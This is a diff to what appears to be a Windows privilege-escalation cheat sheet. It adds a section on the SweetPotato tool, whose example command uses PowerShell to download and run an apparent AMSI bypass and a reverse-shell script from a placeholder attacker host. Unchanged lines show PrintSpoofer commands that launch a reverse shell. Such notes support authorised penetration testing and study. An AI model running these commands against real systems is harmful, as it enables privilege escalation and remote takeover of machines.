@@ -18,7 +18,7 @@
   * [Insecure GUI Apps](#Insecure-GUI-Apps)
   * [Startup apps](#Startup-apps)
   * [Installed applications](#Installed-applications)
-  * [Hot potato](#Hot-potato)
+  * [Hot Potato](#Hot-Potato)
   * [Token impersonation](#Token-impersonation)
   * [Linux Subsystem](#Linux-Subsystem)
 * [UAC bypass](#UAC-bypass) 
@@ -719,7 +719,16 @@ PrintSpoofer is an exploit that targets the Print Spooler service.
 C:\PrivEsc\PrintSpoofer.exe -i -c "C:\temp\reverse.exe"
 C:\PrintSpoofer.exe -i -c cmd.exe
 ```
-
+ 
+### Sweet potato
+- https://github.com/CCob/SweetPotato
+ 
+#### Example execution to get revshell
+```
+./SweetPotato.exe -a "/c powershell.exe iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/Invoke-PowerShellTcp2.ps1')"
+```
+ 
+ 
 ### User privileges
 - https://github.com/hatRiot/token-priv
 - https://github.com/gtworek/Priv2Admin
